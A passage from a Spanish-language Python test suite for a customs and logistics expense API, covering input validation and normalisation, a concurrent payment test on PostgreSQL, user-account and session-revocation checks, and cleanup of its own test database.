    f"{r_k2a.status_code} / {r_k2b.status_code} {mensajes(r_k2b)[:60]} / {r_k2c.status_code}")

# K3: proveedor del exterior admite su identificación tributaria; uno nacional exige RUC válido
r_k3a = c.post("/proveedores/", json={"nombre": "SHIPPER K3", "ruc": "US-99", "categoria": "INTERNACIONAL"}, headers=H["logi"])
r_k3b = c.post("/proveedores/", json={"nombre": "NACIONAL K3", "ruc": "US-99", "categoria": "NACIONAL"}, headers=H["logi"])
chk("K3", "Proveedor del exterior guarda su identificación libre; nacional con RUC inválido -> 422",
    r_k3a.status_code == 200 and r_k3a.json().get("ruc") == "US-99" and r_k3b.status_code == 422,
    f"{r_k3a.status_code} {r_k3a.json().get('ruc')} / {r_k3b.status_code}")

# K4: N° de DAM normalizado, repetido con mensaje claro, inválido en español
mk4 = mk_maestro("F-K4")
r_k4a = c.post("/dams/", json={"id_maestro": mk4, "numero_de_dam": "118-26-10-77", "canal_control": "VERDE"}, headers=H["logi"])
r_k4b = c.post("/dams/", json={"id_maestro": mk4, "numero_de_dam": "118 2026 10 000077", "canal_control": "VERDE"}, headers=H["logi"])
r_k4c = c.post("/dams/", json={"id_maestro": mk4, "numero_de_dam": "DAM-77", "canal_control": "VERDE"}, headers=H["logi"])
chk("K4", "DAM: '118-26-10-77' se guarda como 118-2026-10-000077; repetida -> 400 con su contenedor; formato inválido -> 422",
    r_k4a.json().get("numero_de_dam") == "118-2026-10-000077" and r_k4b.status_code == 400 and "F-K4" in det(r_k4b)
    and r_k4c.status_code == 422 and "Formato esperado" in mensajes(r_k4c),
    f"{r_k4a.json().get('numero_de_dam')} / {r_k4b.status_code} {det(r_k4b)[:60]} / {r_k4c.status_code}")

# K5: una DAM antigua con otro formato se edita sin tocar su número; cambiarlo exige el formato
dam_vieja = models.DetalleDam(id_maestro=mk4, numero_de_dam="DAM ANTIGUA K5", canal_control="VERDE"); db.add(dam_vieja); db.commit()
r_k5a = c.put(f"/dams/{dam_vieja.id_dam}", json={"numero_de_dam": "DAM ANTIGUA K5", "serie": "S9"}, headers=H["logi"])
r_k5b = c.put(f"/dams/{dam_vieja.id_dam}", json={"numero_de_dam": "118-2026-10-000077"}, headers=H["logi"])
r_k5c = c.put(f"/dams/{dam_vieja.id_dam}", json={"numero_de_dam": "118-2026-10-78"}, headers=H["logi"])
chk("K5", "DAM antigua: editar la serie no exige formato; cambiar el número a uno repetido 400, a uno válido se normaliza",
    r_k5a.status_code == 200 and r_k5b.status_code == 400 and r_k5c.json().get("numero_de_dam") == "118-2026-10-000078",
    f"{r_k5a.status_code} / {r_k5b.status_code} / {r_k5c.json().get('numero_de_dam')}")

# K6: comprobante de proveedor nacional normalizado y validado al crear y al editar; del exterior queda libre
prov_nac = c.post("/proveedores/", json={"nombre": "NACIONAL K6", "ruc": ruc_valido("2060000002")}, headers=H["logi"]).json()
prov_ext = r_k3a.json()
dk6 = mk_dam(mk4, "DAM-K6")
def gasto_k6(proveedor, numero):
    return c.post("/gastos/", json={"id_dam": dk6, "id_concepto": c_otro.id_concepto, "id_proveedor": proveedor["id_proveedor"],
                                     "id_tipo_doc": doc.id_tipo_doc, "monto_original": "10", "numero_documento": numero}, headers=H["logi"])
r_k6a = gasto_k6(prov_nac, " f001 - 5 ")
r_k6b = gasto_k6(prov_nac, "F001123")
r_k6c = gasto_k6(prov_nac, "F001-6")
r_k6d = gasto_k6(prov_ext, "INV-2026/55")
r_k6e = c.put(f"/gastos/{r_k6c.json().get('id_gasto')}", json={"numero_documento": "F001-5"}, headers=H["logi"])
r_k6f = c.put(f"/gastos/{r_k6c.json().get('id_gasto')}", json={"numero_documento": "f001-7"}, headers=H["logi"])
chk("K6", "Comprobante nacional: 'f001 - 5' -> F001-00000005, sin guion 422, editar a uno repetido 400 (antes se aceptaba) y se normaliza al editar; del exterior se guarda tal cual",
    r_k6a.json().get("numero_documento") == "F001-00000005" and r_k6b.status_code == 422
    and r_k6d.json().get("numero_documento") == "INV-2026/55" and r_k6e.status_code == 400
    and r_k6f.json().get("numero_documento") == "F001-00000007",
    f"{r_k6a.json().get('numero_documento')} / {r_k6b.status_code} / {r_k6d.json().get('numero_documento')} / {r_k6e.status_code} / {r_k6f.json().get('numero_documento')}")

# K7: los errores de formato llegan en español y con el nombre del campo en pantalla
r_k7a = c.post("/gastos/", json={"id_dam": dk6, "id_concepto": c_otro.id_concepto, "id_proveedor": prov_ext["id_proveedor"],
                                "id_tipo_doc": doc.id_tipo_doc, "monto_original": "10.123"}, headers=H["logi"])
r_k7b = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": imp.id_importador, "numero_operacion": "   ",
                                   "monto_total": "abc", "moneda": "USD", "fecha_transferencia": "ayer"}, headers=H["teso"])
chk("K7", "Mensajes 422 en español con el nombre del campo",
    "Monto admite como máximo 2 decimales." in mensajes(r_k7a)
    and "N° de operación: no puede quedar vacío." in mensajes(r_k7b) and "Monto del voucher debe ser un número" in mensajes(r_k7b)
    and "Fecha de transferencia no es una fecha válida" in mensajes(r_k7b),
    f"{mensajes(r_k7a)[:60]} / {mensajes(r_k7b)[:110]}")

# K8: expediente con fechas al revés o factura repetida
r_k8a = c.post("/maestros/", json={"numero_factura": "F-K8", "fecha_embarque": "2026-03-10", "fecha_arribo": "2026-03-01"}, headers=H["logi"])
r_k8b = c.post("/maestros/", json={"numero_factura": " F-K4 "}, headers=H["logi"])
r_k8c = c.put(f"/maestros/{mk4}", json={"fecha_embarque": "2026-03-10", "fecha_arribo": "2026-03-01"}, headers=H["logi"])
chk("K8", "Expediente: arribo antes que embarque -> 422 (al crear y al editar); factura repetida -> 400 con mensaje (antes 500)",
    r_k8a.status_code == 422 and "arribo" in mensajes(r_k8a) and r_k8b.status_code == 400 and "F-K4" in det(r_k8b)
    and r_k8c.status_code == 422,
    f"{r_k8a.status_code} / {r_k8b.status_code} {det(r_k8b)[:50]} / {r_k8c.status_code}")

# ==========================================
# 4. PRUEBA DE CONCURRENCIA REAL (PostgreSQL)
# ==========================================
print("\n=========== D) PRUEBA DE CONCURRENCIA REAL (PostgreSQL) ===========")
v_conc = mk_voucher(1000, num="OP-CONC-01")
id_v_conc = v_conc["id_voucher"]

gastos_conc = []
m_conc = mk_maestro("F-CONC-01")
d_conc = mk_dam(m_conc, "DAM-CONC-01")
for idx in range(20):
    g_id = mk_gasto(d_conc, c_otro.id_concepto, 100, doc_n=f"DOC-CONC-{idx:02d}")
    gastos_conc.append(g_id)

def lanzar_pago_hilo(item):
    idx, gasto_id = item
    client_thread = TestClient(main.app)
    headers_thread = {
        **H["teso"],
        "Idempotency-Key": f"conc-key-{idx:02d}"
    }
    body = {
        "id_gasto": gasto_id,
        "voucher_id": id_v_conc,
        "moneda": "USD",
        "importe": "100.00",
        "tipo_cambio": "1.00",
        "pago_moneda_cruzada": False
    }
    response = client_thread.post("/pagos/", json=body, headers=headers_thread)
    return idx, response.status_code, response.text

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    resultados = list(executor.map(lanzar_pago_hilo, enumerate(gastos_conc)))

status_codes = [r[1] for r in resultados]
count_200 = status_codes.count(200)
count_400 = status_codes.count(400)
count_409 = status_codes.count(409)
count_500 = status_codes.count(500)
otros_codes = [sc for sc in status_codes if sc not in (200, 400, 409)]

db.expire_all()
v_final = db.get(models.VoucherBancario, id_v_conc)
saldo_final = v_final.saldo_disponible

pagos_voucher = db.query(models.RegistroPago).filter_by(voucher_id=id_v_conc, estado_registro="ACTIVO").all()
suma_pagos = sum((p.monto_moneda_origen for p in pagos_voucher), Decimal("0.00"))

cond_a = (count_500 == 0)
# Con espera de bloqueo (lock_timeout) los pagos hacen cola: el saldo alcanza para 10 exactos
# y los otros 10 deben fallar por SALDO (400), no por colisión (409).
cond_b = (count_200 == 10 and count_400 == 10 and count_409 == 0)
cond_c = (saldo_final == Decimal("0.00"))
cond_d = (suma_pagos == Decimal("1000.00"))

concurrencia_ok = cond_a and cond_b and cond_c and cond_d
evid_conc = f"200: {count_200}, 400: {count_400}, 409: {count_409}, 500: {count_500}, otros: {otros_codes} | Saldo final: {saldo_final} | Suma debitada: {suma_pagos}"
chk("CONC-01", "Concurrencia real: 20 pagos simultáneos contra voucher de USD 1000", concurrencia_ok, evid_conc)

# ==========================================
# L) CUENTAS DE USUARIO (pantalla de usuarios)
# ==========================================
print("\n=========== L) CUENTAS DE USUARIO ===========")
import jwt as _jwt
from security import ALGORITHM as _ALG, SECRET_KEY as _SK
limiter.enabled = False


def tok_emitido_hace(nombre, segundos=30):
    """Token como el de una sesión abierta hace `segundos` (para probar el cierre de sesiones)."""
    u = db.query(models.Usuario).filter_by(username=nombre).first()
    ahora = datetime.datetime.now(datetime.timezone.utc)
    carga = {"sub": nombre, "id_rol": u.id_rol, "id_usuario": u.id_usuario,
             "iat": ahora - datetime.timedelta(seconds=segundos), "exp": ahora + datetime.timedelta(minutes=30)}
    return {"Authorization": "Bearer " + _jwt.encode(carga, _SK, algorithm=_ALG)}


r_l1a = c.get("/usuarios/", headers=H["admin"])
r_l1b = c.get("/usuarios/", headers=H["teso"])
r_l1c = c.post("/usuarios/", json={"username": "otro.correo", "email": "ADMIN@x.test", "password": "Clave-Segura-1", "id_rol": 2}, headers=H["admin"])
chk("L1", "Solo el Administrador lista usuarios (sin contraseña); un correo ya usado se rechaza (sin importar mayúsculas)",
    r_l1a.status_code == 200 and all("password" not in str(u.keys()) for u in r_l1a.json()) and r_l1b.status_code == 403
    and r_l1c.status_code == 400 and "correo" in det(r_l1c),
    f"{r_l1a.status_code} / {r_l1b.status_code} / {r_l1c.status_code} {det(r_l1c)[:50]}")

id_admin = users["admin"]
r_l2a = c.put(f"/usuarios/{id_admin}", json={"is_active": False}, headers=H["admin"])
r_l2b = c.put(f"/usuarios/{id_admin}", json={"id_rol": 2}, headers=H["admin"])
chk("L2", "El Administrador no puede desactivarse ni quitarse su rol (no se queda el sistema sin administrador)",
    r_l2a.status_code == 400 and "propia cuenta" in det(r_l2a) and r_l2b.status_code == 400,
    f"{r_l2a.status_code} {det(r_l2a)[:40]} / {r_l2b.status_code} {det(r_l2b)[:50]}")

# Un segundo administrador que intenta desactivar al único otro: queda uno activo, sí se puede; el último, no
r_l3 = c.post("/usuarios/", json={"username": "admin2", "email": "admin2@x.test", "password": "Clave-Segura-1", "id_rol": 1}, headers=H["admin"])
H["admin2"] = tok_emitido_hace("admin2")
r_l3a = c.put(f"/usuarios/{id_admin}", json={"is_active": False}, headers=H["admin2"])      # quedan 2 -> se puede
r_l3b = c.put(f"/usuarios/{r_l3.json()['id_usuario']}", json={"id_rol": 2}, headers=H["admin2"])  # a sí mismo -> no
r_l3c = c.get("/usuarios/", headers=H["admin"])                                              # admin desactivado: 401 ya
r_l3d = c.put(f"/usuarios/{id_admin}", json={"is_active": True}, headers=H["admin2"])
chk("L3", "Desactivar a un usuario corta su sesión de inmediato; reactivarlo la devuelve",
    r_l3.status_code == 200 and r_l3a.status_code == 200 and r_l3b.status_code == 400 and r_l3c.status_code == 401
    and r_l3d.status_code == 200 and c.get("/usuarios/", headers=H["admin"]).status_code == 200,
    f"{r_l3.status_code} / {r_l3a.status_code} / {r_l3b.status_code} / {r_l3c.status_code} / {r_l3d.status_code}")

# El cambio de rol rige en la siguiente petición (el rol se lee de la base, no del token)
r_l4 = c.post("/usuarios/", json={"username": "rol.cambia", "email": "rol.cambia@x.test", "password": "Clave-Segura-1", "id_rol": 4}, headers=H["admin"])
H["rolc"] = tok_emitido_hace("rol.cambia")
r_l4a = c.post("/maestros/", json={"numero_factura": "F-L4-A"}, headers=H["rolc"])
c.put(f"/usuarios/{r_l4.json()['id_usuario']}", json={"id_rol": 2}, headers=H["admin"])
r_l4b = c.post("/maestros/", json={"numero_factura": "F-L4-B"}, headers=H["rolc"])
chk("L4", "Cambiar el rol rige de inmediato: como Auditoría no crea expedientes (403); como Logística sí (200)",
    r_l4a.status_code == 403 and r_l4b.status_code == 200, f"{r_l4a.status_code} / {r_l4b.status_code}")

# Restablecer la contraseña cierra las sesiones abiertas con la anterior
id_rolc = r_l4.json()["id_usuario"]
sesion_vieja = tok_emitido_hace("rol.cambia")
r_l5a = c.put(f"/usuarios/{id_rolc}/clave", json={"password": "corta"}, headers=H["admin"])
r_l5b = c.put(f"/usuarios/{id_rolc}/clave", json={"password": "Nueva-Clave-22"}, headers=H["admin"])
r_l5c = c.get("/maestros/", headers=sesion_vieja)
r_l5d = c.post("/login", data={"username": "rol.cambia", "password": "Nueva-Clave-22"}, headers={"X-Auth-Mode": "bearer"})
chk("L5", "Restablecer contraseña: exige contraseña segura, cierra la sesión anterior (401) y la nueva permite entrar",
    r_l5a.status_code == 422 and r_l5b.status_code == 200 and r_l5c.status_code == 401 and "contraseña cambió" in det(r_l5c)
    and r_l5d.status_code == 200,
    f"{r_l5a.status_code} / {r_l5b.status_code} / {r_l5c.status_code} {det(r_l5c)[:40]} / login {r_l5d.status_code}")

# Cambio de la contraseña propia
propia = {"Authorization": f"Bearer {r_l5d.json().get('access_token')}"}
time.sleep(1.1)   # la nueva marca de cambio debe quedar después de la emisión de esta sesión
r_l6a = c.put("/usuarios/me/clave", json={"clave_actual": "equivocada", "clave_nueva": "Otra-Clave-333"}, headers=propia)
r_l6b = c.put("/usuarios/me/clave", json={"clave_actual": "Nueva-Clave-22", "clave_nueva": "Nueva-Clave-22"}, headers=propia)
r_l6c = c.put("/usuarios/me/clave", json={"clave_actual": "Nueva-Clave-22", "clave_nueva": "Otra-Clave-333"}, headers=propia)
r_l6d = c.get("/maestros/", headers=propia)
chk("L6", "Contraseña propia: exige la actual y una distinta; al cambiarla la sesión se cierra para entrar con la nueva",
    r_l6a.status_code == 400 and r_l6b.status_code == 400 and r_l6c.status_code == 200 and r_l6d.status_code == 401,
    f"{r_l6a.status_code} / {r_l6b.status_code} / {r_l6c.status_code} / {r_l6d.status_code}")
limiter.enabled = True

fallas = [x for x in R if not x[2]]
print(f"\nRESUMEN TOTAL: {len(R)-len(fallas)}/{len(R)} pruebas pasan." + (" Fallan: " + ", ".join(x[0] for x in fallas) if fallas else ""))

# ==========================================
# 5. LIMPIEZA FINAL DE LA BASE DE PRUEBAS
# ==========================================
db.close()
if os.environ.get("CONSERVAR_BASE_PRUEBAS") == "1":
    # Útil para depurar: deja los datos generados por la batería en la base de pruebas
    print(f"\n[LIMPIEZA FINAL] Omitida (CONSERVAR_BASE_PRUEBAS=1): los datos quedan en {db_name}.")
else:
    print(f"\n[LIMPIEZA FINAL] Limpiando la base de datos {db_name} ...")
    with engine_clean.connect() as conn:
        conn.execute(text("DROP SCHEMA public CASCADE; CREATE SCHEMA public;"))
    print("✅ [LIMPIEZA FINAL] Esquema public limpiado.")

# Código de salida distinto de cero si alguna verificación falló (lo usan pytest y la integración continua)
sys.exit(1 if fallas else 0)
